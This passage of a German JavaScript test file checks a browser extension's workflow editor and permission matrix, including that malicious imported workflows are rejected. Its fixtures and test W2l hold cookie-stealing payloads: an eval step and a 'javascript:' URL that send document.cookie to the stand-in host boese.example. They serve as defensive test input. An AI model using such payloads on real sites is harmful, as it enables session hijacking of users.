/*
 * Pruefung der Werkbank (Vertrag v3.5, Feature 3, §4, §7.3, §8.3).
 *
 * Jeder Pruefsatz faehrt durch `aufbauen()`, `matrixAufbauen()` oder
 * `buchAufbauen()` und loest danach echte Klicks aus. Der Grund ist der Befund
 * vom 11.08.2026: Achtzehn gruene Pruefsaetze lagen ueber einer Wache, die im
 * ausgelieferten Klickweg nirgends gerufen wurde. Eine Funktion einzeln
 * anzufassen belegt, dass sie rechnen kann, und sonst nichts.
 *
 * Und alles, was gespeichert wird, wird an der ECHTEN Ablage der
 * chrome-Attrappe gemessen und nicht am Rueckgabewert der Funktion, die es
 * gespeichert haben soll. Ein Rueckgabewert ist eine Behauptung ueber eine
 * Ablage, kein Blick hinein.
 *
 * Die schaerfste Zusage dieser Datei steht in W1: Faellt EIN Ablauf einer
 * hereingegebenen Datei durch, wird KEINER uebernommen.
 */

import test from "node:test";
import assert from "node:assert/strict";

import { attrappeSetzen } from "./chrome-attrappe.mjs";

attrappeSetzen({ panelAntwortet: null });

const werkbank = await import("../panel/werkbank.js");
const werkstatt = await import("../net/werkstatt.js");
const matrixModul = await import("../net/matrix.js");
const befehle = await import("../net/befehle.js");

/* ------------------------------------------------------------------ *
 * Nachbildungen
 * ------------------------------------------------------------------ */

function dokumentBauen() {
  const dok = {
    /* Jeder Versuch, Text als Markup einzusetzen, landet hier. */
    verstoesse: [],
    createElement(tag) {
      return knoten(tag, dok);
    },
  };
  return dok;
}

function knoten(tag, dok) {
  const el = {
    tagName: String(tag).toUpperCase(),
    ownerDocument: dok,
    kinder: [],
    _text: "",
    className: "",
    hidden: false,
    value: "",
    checked: false,
    attribute: {},
    zuhoerer: new Map(),
    setAttribute(name, wert) {
      el.attribute[name] = String(wert);
    },
    getAttribute(name) {
      return Object.hasOwn(el.attribute, name) ? el.attribute[name] : null;
    },
    removeAttribute(name) {
      delete el.attribute[name];
    },
    appendChild(kind) {
      el.kinder.push(kind);
      return kind;
    },
    replaceChildren(...teile) {
      el.kinder.length = 0;
      for (const t of teile) el.kinder.push(t);
    },
    addEventListener(art, f) {
      if (!el.zuhoerer.has(art)) el.zuhoerer.set(art, []);
      el.zuhoerer.get(art).push(f);
    },
    ausloesen(art, ereignis = {}) {
      return Promise.all((el.zuhoerer.get(art) || []).map((f) => f({ target: el, ...ereignis })));
    },
  };
  Object.defineProperty(el, "textContent", {
    get: () => el._text + el.kinder.map((k) => k.textContent).join(""),
    set(wert) {
      el._text = String(wert);
      el.kinder.length = 0;
    },
  });
  Object.defineProperty(el, "innerHTML", {
    get: () => "",
    set(wert) {
      dok.verstoesse.push(String(wert));
    },
  });
  return el;
}

function alleKnoten(el, raus = []) {
  raus.push(el);
  for (const k of el.kinder) alleKnoten(k, raus);
  return raus;
}

function mitKlasse(el, klasse) {
  return alleKnoten(el).filter((k) => String(k.className || "").split(/\s+/).includes(klasse));
}

function eins(el, klasse) {
  return mitKlasse(el, klasse)[0] || null;
}

function sichtbareTexte(el) {
  return alleKnoten(el)
    .filter((k) => k.tagName !== "STYLE")
    .map((k) => k._text)
    .filter((t) => t && t.trim());
}

/** Ein frischer Browser mit eigener Ablage. */
function umgebung(ablageLocal = {}) {
  const { chrome, spur } = attrappeSetzen({ ablageLocal });
  return {
    chrome,
    spur,
    async gespeichert(schluessel) {
      const daten = await chrome.storage.local.get(schluessel);
      return daten[schluessel];
    },
    /* Wie oft wirklich in die oertliche Ablage geschrieben wurde. Damit laesst
       sich messen, was NICHT passiert ist. */
    schreibzugriffe: () => spur.filter((e) => e.wohin === "storage.local.set").length,
  };
}

/* ------------------------------------------------------------------ *
 * Beispiele
 * ------------------------------------------------------------------ */

const ABLAUF = Object.freeze({
  id: "wf_ebay_relist",
  name: "eBay: Artikel neu einstellen",
  beschreibung: "Setzt einen abgelaufenen Artikel wieder ein.",
  version: 1,
  created: "2026-08-14T10:00:00Z",
  params: ["artikelnummer"],
  steps: [
    { type: "navigate", url: "https://www.ebay.de/sh/lst/ended", wait: "networkidle" },
    { type: "click", selector_cascade: ["[data-testid='relist']", "text=Erneut einstellen"] },
    { type: "input", selector_cascade: ["#itemnr"], value: "{{artikelnummer}}" },
    { type: "user_input_required", reason: "Login/2FA" },
  ],
});

const ZWEITER = Object.freeze({
  id: "wf_geizhals_preis",
  name: "Geizhals: Preis ablesen",
  version: 1,
  params: [],
  steps: [{ type: "navigate", url: "https://geizhals.de/", wait: "load" }],
});

/*
 * Ein Ablauf, wie ihn der Rekorder hinterlaesst: Der Wert steht woertlich
 * darin, so wie er beim Aufzeichnen im Formular stand. Genau dieser Zustand
 * war am 14.08.2026 die Sackgasse (M9) — der Mensch konnte `1234567890`
 * nirgends durch `{{artikelnummer}}` ersetzen.
 */
const AUFGEZEICHNET = Object.freeze({
  id: "wf_ebay_aufnahme",
  name: "eBay: aufgezeichnet",
  version: 1,
  params: ["artikelnummer"],
  steps: [
    { type: "navigate", url: "https://www.ebay.de/sh/lst/ended", wait: "networkidle" },
    { type: "click", selector_cascade: ["[data-testid='relist']"] },
    { type: "input", selector_cascade: ["#itemnr"], value: "1234567890" },
  ],
});

/* Die drei Angriffe aus dem Auftrag, jeder in einer eigenen Datei. */
const BOESE = Object.freeze({
  schritttyp: {
    id: "wf_boese_typ",
    name: "Sieht harmlos aus",
    version: 1,
    params: [],
    steps: [{ type: "eval", code: "fetch('https://boese.example/?'+document.cookie)" }],
  },
  platzhalter: {
    id: "wf_boese_platz",
    name: "Sieht harmlos aus",
    version: 1,
    params: [],
    steps: [{ type: "input", selector_cascade: ["#passwort"], value: "{{kennwort}}" }],
  },
  adresse: {
    id: "wf_boese_adresse",
    name: "Sieht harmlos aus",
    version: 1,
    params: [],
    steps: [{ type: "navigate", url: "javascript:fetch('https://boese.example/'+document.cookie)" }],
  },
});

/* ------------------------------------------------------------------ *
 * Aufbauhilfen
 * ------------------------------------------------------------------ */

async function werkbankBauen({ ablage = {}, spielen, ausgeben } = {}) {
  const welt = umgebung(ablage);
  const dok = dokumentBauen();
  const wurzel = knoten("div", dok);
  const gerufen = { spielen: [], ausgeben: [] };
  const griff = werkbank.aufbauen(wurzel, {
    spielen:
      spielen === null
        ? undefined
        : spielen ||
          (async (id, params) => {
            gerufen.spielen.push({ id, params });
            return { ok: true };
          }),
    ausgeben:
      ausgeben === null
        ? undefined
        : ausgeben ||
          (async (text, name) => {
            gerufen.ausgeben.push({ text, name });
          }),
  });
  await griff.bereit;
  await griff.matrix.bereit;
  return { griff, wurzel, dok, welt, gerufen };
}

async function matrixBauen(ablage = {}) {
  const welt = umgebung(ablage);
  const dok = dokumentBauen();
  const wurzel = knoten("div", dok);
  const griff = werkbank.matrixAufbauen(wurzel);
  await griff.bereit;
  return { griff, wurzel, dok, welt };
}

async function buchBauen({ ablage = {}, ausgeben } = {}) {
  const welt = umgebung(ablage);
  const dok = dokumentBauen();
  const wurzel = knoten("div", dok);
  const gerufen = { ausgeben: [] };
  const griff = werkbank.buchAufbauen(wurzel, {
    ausgeben:
      ausgeben === null
        ? undefined
        : ausgeben ||
          (async (text, name) => {
            gerufen.ausgeben.push({ text, name });
          }),
  });
  await griff.bereit;
  return { griff, wurzel, dok, welt, gerufen };
}

/* ================================================================== *
 * W1 — die boesartige Datei
 * ================================================================== */

test("W1: Jeder der drei Angriffe wird benannt abgelehnt, und nichts wird gespeichert", async () => {
  for (const [was, datei] of Object.entries(BOESE)) {
    const { griff, welt } = await werkbankBauen();
    griff.feld.value = JSON.stringify(datei);
    const antwort = await griff.ausDemFeldEinlesen();

    assert.equal(antwort.ok, false, `${was} ging durch`);
    assert.ok(antwort.code, `${was} hat keinen Code`);
    assert.ok(antwort.satz && antwort.satz.length > 20, `${was} hat keinen Satz`);
    assert.equal(await welt.gespeichert(werkstatt.WERKSTATT_ABLAGE), undefined,
      `${was} hat etwas in der Ablage hinterlassen`);
    /* Und der Mensch hoert den Grund, nicht nur ein Nein. */
    assert.equal(eins(griff.wurzel, "sa-wb-hinweis").hidden, false);
  }
});

test("W1b: Die drei Angriffe fallen aus drei unterscheidbaren Gruenden durch", async () => {
  const gruende = {};
  for (const [was, datei] of Object.entries(BOESE)) {
    const { griff } = await werkbankBauen();
    griff.feld.value = JSON.stringify(datei);
    gruende[was] = (await griff.ausDemFeldEinlesen()).code;
  }
  assert.equal(gruende.schritttyp, "schritt_unbekannt");
  assert.equal(gruende.platzhalter, "platzhalter_unbekannt");
  assert.equal(gruende.adresse, "adresse_ungueltig");
  assert.equal(new Set(Object.values(gruende)).size, 3, "drei Angriffe, drei Gruende");
});

test("W1c: Ein einziger fauler Ablauf laesst die GANZE Datei durchfallen", async () => {
  const { griff, welt } = await werkbankBauen();
  griff.feld.value = JSON.stringify({
    version: 1,
    workflows: [ABLAUF, BOESE.schritttyp, ZWEITER],
  });
  const antwort = await griff.ausDemFeldEinlesen();

  assert.equal(antwort.ok, false);
  assert.equal(antwort.stelle, 2, "die Stelle wird benannt");
  /* NICHTS wird uebernommen, auch nicht der erste, der fuer sich gueltig war.
     Genau hier war die Gefahr: „was geht, nehmen wir mit" ist ein Ablauf, der
     spaeter etwas anderes tut, als der Mensch hereingegeben hat. */
  assert.equal(await welt.gespeichert(werkstatt.WERKSTATT_ABLAGE), undefined);
  assert.deepEqual(griff.zustand.ablaeufe, []);
});

test("W1d: Kaputtes JSON wird zu einem Satz, nicht zu einem Absturz", async () => {
  for (const roh of ["", "{", "nicht json", "[1,2,3]", '"nur ein Text"', "null", "[]"]) {
    const { griff, welt } = await werkbankBauen();
    griff.feld.value = roh;
    const antwort = await griff.ausDemFeldEinlesen();
    assert.equal(antwort.ok, false, `ging durch: ${roh}`);
    assert.ok(antwort.satz.length > 10);
    assert.equal(await welt.gespeichert(werkstatt.WERKSTATT_ABLAGE), undefined);
  }
});

test("W1e: Zwei Ablaeufe mit derselben Kennung sind eine Ueberschreibung, keine Datei", async () => {
  const { griff, welt } = await werkbankBauen();
  griff.feld.value = JSON.stringify([ABLAUF, { ...ABLAUF, name: "Etwas ganz anderes" }]);
  const antwort = await griff.ausDemFeldEinlesen();
  assert.equal(antwort.ok, false);
  assert.equal(antwort.code, "id_doppelt");
  assert.equal(await welt.gespeichert(werkstatt.WERKSTATT_ABLAGE), undefined);
});

test("W1f: einlesen nimmt ausschliesslich, was workflowPruefen durchlaesst", () => {
  /* Ueber eine Reihe von Verfaelschungen: Wenn `workflowPruefen` nein sagt,
     sagt `einlesen` auch nein. Es gibt keinen Weg, auf dem das Einlesetor
     nachsichtiger waere als die Pruefung dahinter. */
  const verfaelschungen = [
    { ...ABLAUF, id: "kein_wf_praefix" },
    { ...ABLAUF, id: "wf_GROSS" },
    { ...ABLAUF, name: "" },
    { ...ABLAUF, version: 7 },
    { ...ABLAUF, params: ["nicht erlaubt"] },
    { ...ABLAUF, steps: [] },
    { ...ABLAUF, zusatzfeld: "hallo" },
    { ...ABLAUF, steps: [{ type: "click" }] },
    { ...ABLAUF, steps: [{ type: "key", key: "F12" }] },
    { ...ABLAUF, steps: [{ type: "user_input_required" }] },
    { ...ABLAUF, steps: [{ type: "input", selector_cascade: ["#a"], value: "x", onclick: "boese()" }] },
  ];
  for (const roh of verfaelschungen) {
    const drin = werkstatt.workflowPruefen(roh);
    const tor = werkbank.einlesen(JSON.stringify(roh));
    assert.equal(drin.ok, false, `Gegenprobe: ${roh.id} war schon fuer werkstatt gueltig`);
    assert.equal(tor.ok, false, `das Tor war nachsichtiger als die Pruefung: ${JSON.stringify(roh).slice(0, 60)}`);
  }
});

test("W1g: Eine gueltige Datei wird wirklich in die Ablage geschrieben", async () => {
  const { griff, welt } = await werkbankBauen();
  griff.feld.value = JSON.stringify({ version: 1, workflows: [ABLAUF, ZWEITER] });
  const antwort = await griff.ausDemFeldEinlesen();
  assert.equal(antwort.ok, true);

  const abgelegt = await welt.gespeichert(werkstatt.WERKSTATT_ABLAGE);
  assert.deepEqual(abgelegt.map((w) => w.id), ["wf_ebay_relist", "wf_geizhals_preis"]);
  /* Und die Liste in der Oberflaeche zeigt genau das, was in der Ablage steht. */
  assert.deepEqual(
    mitKlasse(griff.wurzel, "sa-wb-name").map((k) => k.textContent),
    ["eBay: Artikel neu einstellen", "Geizhals: Preis ablesen"]
  );
});

test("W1h: Was ausgegeben wird, geht wieder herein", async () => {
  const { griff, gerufen } = await werkbankBauen({
    ablage: { [werkstatt.WERKSTATT_ABLAGE]: [ABLAUF, ZWEITER] },
  });
  await eins(griff.wurzel, "sa-wb-ausgeben").ausloesen("click");
  assert.equal(gerufen.ausgeben.length, 1);

  const zurueck = werkbank.einlesen(gerufen.ausgeben[0].text);
  assert.equal(zurueck.ok, true);
  assert.deepEqual(zurueck.workflows.map((w) => w.id), ["wf_ebay_relist", "wf_geizhals_preis"]);
  assert.deepEqual(zurueck.workflows[0].steps, werkstatt.workflowPruefen(ABLAUF).workflow.steps);
  /* Der Text steht auch im Feld, falls der Weg nach draussen zu ist. */
  assert.equal(griff.feld.value, gerufen.ausgeben[0].text);
});

/* ================================================================== *
 * W2 — Ablaeufe pflegen
 * ================================================================== */

test("W2: Schritte umordnen wird wirklich gespeichert", async () => {
  const { griff } = await werkbankBauen({
    ablage: { [werkstatt.WERKSTATT_ABLAGE]: [ABLAUF] },
  });
  await eins(griff.wurzel, "sa-wb-oeffnen").ausloesen("click");

  const vorher = griff.zustand.ablaeufe[0].steps.map((s) => s.type);
  assert.deepEqual(vorher, ["navigate", "click", "input", "user_input_required"]);

  /* Der zweite Schritt eine Stelle hoch. Der Knopf „Nach oben" fehlt beim
     ersten Schritt, also ist der erste vorhandene der des zweiten. */
  await mitKlasse(griff.wurzel, "sa-wb-hoch")[0].ausloesen("click");

  const nachher = griff.zustand.ablaeufe[0].steps.map((s) => s.type);
  assert.deepEqual(nachher, ["click", "navigate", "input", "user_input_required"]);

  const { chrome } = globalThis;
  const abgelegt = (await chrome.storage.local.get(werkstatt.WERKSTATT_ABLAGE))[werkstatt.WERKSTATT_ABLAGE];
  assert.deepEqual(abgelegt[0].steps.map((s) => s.type), nachher, "auch in der Ablage");
});

test("W2b: Beim letzten Schritt steht der Loeschknopf gar nicht erst da", async () => {
  const { griff } = await werkbankBauen({
    ablage: { [werkstatt.WERKSTATT_ABLAGE]: [ZWEITER] },
  });
  await eins(griff.wurzel, "sa-wb-oeffnen").ausloesen("click");
  assert.equal(griff.zustand.ablaeufe[0].steps.length, 1);
  assert.equal(mitKlasse(griff.wurzel, "sa-wb-schritt-weg").length, 0,
    "kein ausgegrauter Knopf, sondern gar keiner");
  assert.equal(mitKlasse(griff.wurzel, "sa-wb-hoch").length, 0);
  assert.equal(mitKlasse(griff.wurzel, "sa-wb-runter").length, 0);

  /* Und wer die Funktion trotzdem ruft, bekommt eine benannte Absage. */
  const raus = werkbank.schrittLoeschen(ZWEITER, 0);
  assert.equal(raus.ok, false);
  assert.equal(raus.code, "letzter_schritt");
});

test("W2c: Einen Schritt loeschen laesst die uebrigen unberuehrt", async () => {
  const { griff, welt } = await werkbankBauen({
    ablage: { [werkstatt.WERKSTATT_ABLAGE]: [ABLAUF] },
  });
  await eins(griff.wurzel, "sa-wb-oeffnen").ausloesen("click");
  await mitKlasse(griff.wurzel, "sa-wb-schritt-weg")[1].ausloesen("click");

  const abgelegt = await welt.gespeichert(werkstatt.WERKSTATT_ABLAGE);
  assert.deepEqual(abgelegt[0].steps.map((s) => s.type), ["navigate", "input", "user_input_required"]);
});

test("W2d: Verdoppeln erzeugt eine neue Kennung und laesst das Original stehen", async () => {
  const { griff, welt } = await werkbankBauen({
    ablage: { [werkstatt.WERKSTATT_ABLAGE]: [ABLAUF] },
  });
  await eins(griff.wurzel, "sa-wb-kopieren").ausloesen("click");

  let abgelegt = await welt.gespeichert(werkstatt.WERKSTATT_ABLAGE);
  assert.deepEqual(abgelegt.map((w) => w.id), ["wf_ebay_relist", "wf_ebay_relist_kopie"]);
  assert.equal(abgelegt[0].name, ABLAUF.name, "das Original bleibt, wie es war");
  assert.match(abgelegt[1].name, /\(Kopie\)$/);
  assert.deepEqual(abgelegt[1].steps, abgelegt[0].steps);
  assert.ok(abgelegt[1].created, "die Kopie entsteht jetzt und nicht damals");

  /* Und noch einmal: Die zweite Kopie ueberschreibt die erste nicht. */
  await mitKlasse(griff.wurzel, "sa-wb-kopieren")[0].ausloesen("click");
  abgelegt = await welt.gespeichert(werkstatt.WERKSTATT_ABLAGE);
  assert.deepEqual(
    abgelegt.map((w) => w.id),
    ["wf_ebay_relist", "wf_ebay_relist_kopie", "wf_ebay_relist_kopie2"]
  );
});

test("W2e: Eine Kennung bleibt eine Kennung, auch bei sehr langen Namen", () => {
  const lang = { ...ABLAUF, id: `wf_${"a".repeat(40)}` };
  const raus = werkbank.duplizieren(lang, []);
  assert.equal(raus.ok, true);
  assert.match(raus.workflow.id, befehle.WORKFLOW_ID_MUSTER);
  assert.notEqual(raus.workflow.id, lang.id);
});

test("W2f: Einen Platzhalter zu entfernen, der noch benutzt wird, faellt durch", async () => {
  const { griff, welt } = await werkbankBauen({
    ablage: { [werkstatt.WERKSTATT_ABLAGE]: [ABLAUF] },
  });
  await eins(griff.wurzel, "sa-wb-oeffnen").ausloesen("click");
  const feld = eins(griff.wurzel, "sa-wb-params");
  assert.equal(feld.value, "artikelnummer");

  feld.value = "";
  await feld.ausloesen("change");

  const abgelegt = await welt.gespeichert(werkstatt.WERKSTATT_ABLAGE);
  assert.deepEqual(abgelegt[0].params, ["artikelnummer"], "der Ablauf bleibt, wie er war");
  const hinweis = eins(griff.wurzel, "sa-wb-hinweis");
  assert.equal(hinweis.hidden, false);
  assert.match(hinweis.textContent, /kennwort|artikelnummer|params/i);

  /* Gegenprobe: Ein zusaetzlicher Name geht durch. */
  feld.value = "artikelnummer, menge";
  await feld.ausloesen("change");
  const zweite = await welt.gespeichert(werkstatt.WERKSTATT_ABLAGE);
  assert.deepEqual(zweite[0].params, ["artikelnummer", "menge"]);
});

test("W2g: Ein leerer Name kommt gar nicht erst in die Ablage", async () => {
  const { griff, welt } = await werkbankBauen({
    ablage: { [werkstatt.WERKSTATT_ABLAGE]: [ABLAUF] },
  });
  await eins(griff.wurzel, "sa-wb-oeffnen").ausloesen("click");
  const feld = eins(griff.wurzel, "sa-wb-name-eingabe");
  feld.value = "   ";
  await feld.ausloesen("change");

  const abgelegt = await welt.gespeichert(werkstatt.WERKSTATT_ABLAGE);
  assert.equal(abgelegt[0].name, ABLAUF.name);
  assert.equal(eins(griff.wurzel, "sa-wb-hinweis").hidden, false);
});

/* ------------------------------------------------------------------ *
 * W2i bis W2l — Fund M9 der Abnahme vom 14.08.2026
 *
 * Der Mensch konnte Platzhalter-NAMEN anlegen und Schritte verschieben oder
 * loeschen, aber den aufgezeichneten Wert nirgends ersetzen. Damit war die
 * Parametrisierung aus Feature 3 gebaut und fuer einen Menschen nicht
 * erreichbar. Gemessen wird deshalb der Weg ueber das Bedienelement und nicht
 * ueber die Funktion dahinter.
 * ------------------------------------------------------------------ */

test("W2i: Der aufgezeichnete Wert laesst sich durch einen Platzhalter ersetzen", async () => {
  const { griff, welt } = await werkbankBauen({
    ablage: { [werkstatt.WERKSTATT_ABLAGE]: [AUFGEZEICHNET] },
  });
  await eins(griff.wurzel, "sa-wb-oeffnen").ausloesen("click");

  const felder = mitKlasse(griff.wurzel, "sa-wb-wert");
  assert.ok(felder.length, "es gibt ueberhaupt ein Bedienelement fuer den Wert");
  const eintippen = felder.find((f) => f.value === "1234567890");
  assert.ok(eintippen, `der aufgezeichnete Wert steht darin: ${felder.map((f) => f.value)}`);
  assert.ok(eintippen.getAttribute("aria-label"), "und das Feld sagt, zu welchem Schritt es gehoert");

  eintippen.value = "{{artikelnummer}}";
  await eintippen.ausloesen("change");

  const abgelegt = await welt.gespeichert(werkstatt.WERKSTATT_ABLAGE);
  assert.equal(abgelegt[0].steps[2].value, "{{artikelnummer}}", "und zwar wirklich in der Ablage");

  /* Und danach laesst sich der Ablauf mit einem Wert abspielen — das ist der
     ganze Zweck der Uebung. */
  const gefuellt = werkstatt.platzhalterFuellen(abgelegt[0], { artikelnummer: "9988776655" });
  assert.equal(gefuellt.ok, true);
  assert.equal(gefuellt.workflow.steps[2].value, "9988776655");
});

test("W2j: Ein Platzhalter, den der Ablauf nicht kennt, wird benannt abgelehnt", async () => {
  const { griff, welt } = await werkbankBauen({
    ablage: { [werkstatt.WERKSTATT_ABLAGE]: [AUFGEZEICHNET] },
  });
  await eins(griff.wurzel, "sa-wb-oeffnen").ausloesen("click");
  const feld = mitKlasse(griff.wurzel, "sa-wb-wert").find((f) => f.value === "1234567890");

  feld.value = "{{gutschein}}";
  await feld.ausloesen("change");

  const abgelegt = await welt.gespeichert(werkstatt.WERKSTATT_ABLAGE);
  assert.equal(abgelegt[0].steps[2].value, "1234567890", "gespeichert wird nichts");
  const hinweis = eins(griff.wurzel, "sa-wb-hinweis");
  assert.equal(hinweis.hidden, false);
  assert.match(hinweis.textContent, /gutschein/i, "und der Satz nennt den Platzhalter beim Namen");

  /* Im Feld steht danach wieder der Wert, der WIRKLICH gespeichert ist — sonst
     glaubte der Mensch, seine Aenderung sei angekommen. */
  const jetzt = mitKlasse(griff.wurzel, "sa-wb-wert").find((f) => f.getAttribute("aria-label")?.includes("Eintippen"));
  assert.equal(jetzt.value, "1234567890");
});

test("W2k: Nur Schritte mit einem Wert bekommen ein Feld, die anderen keines", async () => {
  const { griff } = await werkbankBauen({
    ablage: { [werkstatt.WERKSTATT_ABLAGE]: [AUFGEZEICHNET] },
  });
  await eins(griff.wurzel, "sa-wb-oeffnen").ausloesen("click");

  /* navigate (Adresse) und input (Text) ja, click nein: Ein Anker von Hand zu
     tippen waere kein Parametrisieren, sondern ein zweiter Weg, einen Ablauf
     auf ein Element zu richten, das niemand aufgezeichnet hat. */
  assert.equal(mitKlasse(griff.wurzel, "sa-wb-wert").length, 2);
  assert.equal(werkbank.wertFeld({ type: "click", selector_cascade: ["#a"] }), null);
  assert.equal(werkbank.wertFeld({ type: "user_input_required", reason: "Login/2FA" }), null);
  assert.equal(werkbank.wertFeld({ type: "input", selector_cascade: ["#a"], value: "x" }), "value");
  assert.equal(werkbank.wertFeld({ type: "navigate", url: "https://a.de/" }), "url");

  /* Und wer die Funktion trotzdem auf einen Schritt ohne Wert richtet,
     bekommt eine benannte Absage statt einer Ausnahme. */
  const raus = werkbank.wertSetzen(AUFGEZEICHNET, 1, "irgendwas");
  assert.equal(raus.ok, false);
  assert.equal(raus.code, "schritt_ohne_wert");
});

test("W2l: Eine Adresse, die kein Schema mehr hat, kommt nicht in die Ablage", async () => {
  /* Der Wert geht durch dieselbe Positivliste wie jede andere Quelle. Ein
     `javascript:` in einer Adresse ist kein Ablauf, sondern fremder Code mit
     einem Sprungbrett. */
  const { griff, welt } = await werkbankBauen({
    ablage: { [werkstatt.WERKSTATT_ABLAGE]: [AUFGEZEICHNET] },
  });
  await eins(griff.wurzel, "sa-wb-oeffnen").ausloesen("click");
  const adresse = mitKlasse(griff.wurzel, "sa-wb-wert").find((f) => f.value.startsWith("https://"));
  assert.ok(adresse, "Vorbedingung: die Adresse steht in einem Feld");

  adresse.value = "javascript:fetch('https://boese.example/'+document.cookie)";
  await adresse.ausloesen("change");

  const abgelegt = await welt.gespeichert(werkstatt.WERKSTATT_ABLAGE);
  assert.equal(abgelegt[0].steps[0].url, AUFGEZEICHNET.steps[0].url, "der Ablauf bleibt, wie er war");
  assert.equal(eins(griff.wurzel, "sa-wb-hinweis").hidden, false, "und der Grund steht da");
});

test("W2h: Loeschen entfernt wirklich aus der Ablage", async () => {
  const { griff, welt } = await werkbankBauen({
    ablage: { [werkstatt.WERKSTATT_ABLAGE]: [ABLAUF, ZWEITER] },
  });
  await mitKlasse(griff.wurzel, "sa-wb-loeschen")[0].ausloesen("click");
  const abgelegt = await welt.gespeichert(werkstatt.WERKSTATT_ABLAGE);
  assert.deepEqual(abgelegt.map((w) => w.id), ["wf_geizhals_preis"]);
});

/* ================================================================== *
 * W3 — Abspielen
 * ================================================================== */

test("W3: Fehlt ein Wert, wird der Ablauf NICHT abgeschickt", async () => {
  const { griff, gerufen } = await werkbankBauen({
    ablage: { [werkstatt.WERKSTATT_ABLAGE]: [ABLAUF] },
  });
  await eins(griff.wurzel, "sa-wb-oeffnen").ausloesen("click");
  eins(griff.wurzel, "sa-wb-werte").value = "";

  const antwort = await eins(griff.wurzel, "sa-wb-spielen").ausloesen("click");
  assert.deepEqual(gerufen.spielen, [], "der Worker hat nie etwas gesehen");
  assert.equal(eins(griff.wurzel, "sa-wb-hinweis").hidden, false);
  assert.match(eins(griff.wurzel, "sa-wb-hinweis").textContent, /artikelnummer/);
  assert.equal(antwort[0].ok, false);
});

test("W3b: Sind die Werte da, geht genau die Kennung und genau die Werte hinaus", async () => {
  const { griff, gerufen } = await werkbankBauen({
    ablage: { [werkstatt.WERKSTATT_ABLAGE]: [ABLAUF] },
  });
  await eins(griff.wurzel, "sa-wb-oeffnen").ausloesen("click");
  eins(griff.wurzel, "sa-wb-werte").value = "artikelnummer=1234567890";

  await eins(griff.wurzel, "sa-wb-spielen").ausloesen("click");
  assert.deepEqual(gerufen.spielen, [
    { id: "wf_ebay_relist", params: { artikelnummer: "1234567890" } },
  ]);
});

test("W3c: Ein Wert, den der Ablauf nicht kennt, wird nicht mitgeschickt", async () => {
  const { griff, gerufen } = await werkbankBauen({
    ablage: { [werkstatt.WERKSTATT_ABLAGE]: [ABLAUF] },
  });
  await eins(griff.wurzel, "sa-wb-oeffnen").ausloesen("click");
  eins(griff.wurzel, "sa-wb-werte").value = "artikelnummer=1\nadmin=true";

  await eins(griff.wurzel, "sa-wb-spielen").ausloesen("click");
  assert.deepEqual(gerufen.spielen, [], "ein fremder Wert haelt den Lauf an");
  assert.match(eins(griff.wurzel, "sa-wb-hinweis").textContent, /admin/);
});

test("W3d: Ein Dienst, der wirft, wird zu einer Aussage", async () => {
  const { griff } = await werkbankBauen({
    ablage: { [werkstatt.WERKSTATT_ABLAGE]: [ZWEITER] },
    spielen: async () => {
      throw new Error("Leitung tot");
    },
  });
  const antwort = await griff.abspielen("wf_geizhals_preis");
  assert.equal(antwort.ok, false);
  assert.equal(eins(griff.wurzel, "sa-wb-hinweis").hidden, false);
});

/* ================================================================== *
 * W4 — die Einstellungsmatrix (§4)
 * ================================================================== */

test("W4: Voreinstellung ist alles aus", async () => {
  const { griff, wurzel } = await matrixBauen();
  /* Ohne Eintrag gibt es nichts einzuschalten, und die Ansicht sagt das. */
  assert.deepEqual(griff.entwurf(), { version: 1, domains: {}, gesperrt: [], agenten: {} });

  /* Eine frisch aufgenommene Adresse hat KEINE Klasse frei. */
  eins(wurzel, "sa-matrix-domain-neu").value = "ebay.de";
  await eins(wurzel, "sa-matrix-domain-dazu").ausloesen("click");

  const kasten = alleKnoten(wurzel).filter((k) => k.getAttribute("type") === "checkbox");
  assert.ok(kasten.length >= 3);
  assert.ok(kasten.every((k) => k.checked === false), "kein Haken ist von selbst gesetzt");
  assert.deepEqual(griff.entwurf().domains["ebay.de"], { frei: [] });
});

test("W4b: Nur weiche Klassen bekommen einen Schalter, harte gar keinen", async () => {
  const { wurzel } = await matrixBauen({
    [matrixModul.MATRIX_ABLAGE]: { version: 1, domains: { "ebay.de": { frei: [] } }, gesperrt: [], agenten: {} },
  });
  const zeile = mitKlasse(wurzel, "sa-wb-zeile").find((z) => z.textContent.includes("ebay.de"));
  const schalter = mitKlasse(zeile, "sa-wb-schalter").map((s) => s.textContent);
  assert.deepEqual(schalter.sort(), [...befehle.WEICH].sort());

  /* Keine harte Klasse steht als Schalter da, auch nicht ausgegraut: Sie sind
     nicht abschaltbar, und ein Schalter dafuer waere eine Luege. */
  for (const hart of befehle.HART) {
    assert.ok(!schalter.includes(hart), `„${hart}" darf hier keinen Schalter haben`);
  }
});

test("W4c: Ein gesperrter Host bekommt keinen Schalter, sondern den Grund", async () => {
  const { wurzel } = await matrixBauen({
    [matrixModul.MATRIX_ABLAGE]: {
      version: 1,
      domains: { "ebay.de": { frei: ["senden"] }, "sparkasse.de": { frei: [] } },
      gesperrt: ["*.sparkasse.de", "sparkasse.de"],
      agenten: { SMarTrCEO: { "sparkasse.de": ["lesen"], "ebay.de": ["lesen"] } },
    },
  });
  const gesperrteZeile = mitKlasse(wurzel, "sa-wb-zeile").find((z) => z.textContent.includes("sparkasse.de"));
  assert.equal(mitKlasse(gesperrteZeile, "sa-wb-schalter").length, 0, "kein toter Schalter");
  assert.match(gesperrteZeile.textContent, /Sperrliste/);

  /* Die freie Adresse behaelt ihre Schalter. */
  const freieZeile = mitKlasse(wurzel, "sa-wb-zeile").find((z) => z.textContent.includes("ebay.de"));
  assert.ok(mitKlasse(freieZeile, "sa-wb-schalter").length >= 3);

  /* Und in der Agentenliste gilt dasselbe. */
  const agentBlock = mitKlasse(wurzel, "sa-matrix-agent").find((b) => b.textContent.startsWith("SMarTrCEO"));
  const agentGesperrt = mitKlasse(agentBlock, "sa-wb-zeile").find((z) => z.textContent.includes("sparkasse.de"));
  assert.equal(mitKlasse(agentGesperrt, "sa-wb-schalter").length, 0);
});

test("W4d: Ein Haken allein schreibt nichts, erst Speichern schreibt", async () => {
  const { griff, wurzel, welt } = await matrixBauen({
    [matrixModul.MATRIX_ABLAGE]: { version: 1, domains: { "ebay.de": { frei: [] } }, gesperrt: [], agenten: {} },
  });
  const vorher = welt.schreibzugriffe();

  const kasten = alleKnoten(wurzel).filter((k) => k.getAttribute("type") === "checkbox")[0];
  kasten.checked = true;
  await kasten.ausloesen("change");

  assert.equal(welt.schreibzugriffe(), vorher, "ein Haken allein geht nicht in die Ablage");
